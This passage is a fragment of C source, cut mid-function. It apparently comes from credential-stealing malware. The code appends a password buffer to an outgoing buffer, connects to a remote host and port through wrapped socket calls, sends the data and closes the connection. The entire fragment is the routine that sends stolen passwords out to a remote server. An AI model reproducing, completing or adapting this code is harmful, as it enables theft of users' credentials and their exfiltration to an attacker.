	m_lstrcat( SendBuffer, PswBuffer );
	m_lstrcat( SendBuffer, "\r\n" );

	MemFree( UserAgent );
	MemFree( PswBuffer );

	SOCKET Socket = MyConnect( Host, Port );

	bool b = MySend( Socket, (const char *)SendBuffer, m_lstrlen( SendBuffer ) );
	
	MemFree( SendBuffer );
	
	pclosesocket( Socket );

	return b;
}

